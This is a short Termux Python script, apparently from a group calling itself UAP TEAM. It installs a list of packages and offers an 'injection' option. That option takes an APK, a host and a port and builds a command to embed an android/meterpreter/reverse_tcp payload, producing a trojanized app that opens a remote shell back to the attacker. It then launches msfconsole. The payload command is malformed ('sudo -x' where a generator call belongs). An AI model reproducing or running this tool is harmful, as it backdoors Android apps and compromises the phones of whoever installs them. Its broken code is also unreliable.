import os,sys
os.system('clear')
print('''\033[1;32m
░█─░█ ─█▀▀█ ░█▀▀█ ── ▀▀█▀▀ ░█▀▀▀ ─█▀▀█ ░█▀▄▀█ 
░█─░█ ░█▄▄█ ░█▄▄█ ▀▀ ─░█── ░█▀▀▀ ░█▄▄█ ░█░█░█ 
─▀▄▄▀ ░█─░█ ░█─── ── ─░█── ░█▄▄▄ ░█─░█ ░█──░█''')
print('''\033[1;32m
--------------------[~~~~~~~~~~~~~~]----------------
Telegram : https://t.me/UAP_TEAM

Telegram : https://t.me/UAP_Termux
-------------------[~~~~~~~~~~~~~~~]----------------''')
print('''\033[1;34m
[1]  install the basics 

[2] injection
''')
print('-'*23)
x = input('\033[1;33m□○~~> @ ')
if x == '1':
	os.system('clear')
	os.system('termux-setup-storage;cd;dpkg --configure -a;pkg update -y;pkg upgrade -y;pkg install python -y;pkg install python2 -y;pkg install python2-dev -y;pkg install python3 -y;pkg install pip -y;pkg install pip2;pip2 install requests;pkg install fish -y;pkg install ruby -y;pkg install git -y;pkg install dnsutils -y;pkg install php -y;pkg install perl -y;pkg install nmap -y;pkg install bash -y;pkg install clang -y;pkg install nano -y;pkg install w3m -y;pkg install figlet -y;pkg install cowsay -y;gem install lolcat;pkg install curl -y;pkg install tar -y;pkg install zip -y;pkg install unzip -y;pkg install tor -y;pkg install wget -y;pkg install wgetrc -y;pkg install wcalc -y;pkg install bmon -y;pkg install unrar -y;pkg install toilet -y;pkg install proot -y;pkg install golang -y;pkg install chroot -y;termux-chroot -y;pkg install openssl -y;pkg install cmatrix -y;pkg install openssh -y;apt update && apt upgrade -y')
	os.system('python3 UAP.py')
elif x == '2':
		os.system('clear')
		bom = input('name apk : ')
		host = input('Enter HOST : ')
		port = input('Enter PORT : ')
		ba = input('new name  : ')
		pw = input('save path : ')
		print('plase wait')
		os.system('sudo -x '+bom+' -p android/meterpreter/reverse_tcp LHOST='+host+' LPORT='+port+' R> /'+pw+'/'+ba+'.apk')
		os.system('clear')
		print('do you run metasploit')
		va = input('Enter [ n / y ] ○~~> : ')
		if va == 'y':
			os.system('clear')
			print('plase wait')
			os.system('msfconsole')
		else:
			if va == 'n':
				os.system('python3 UAP.py')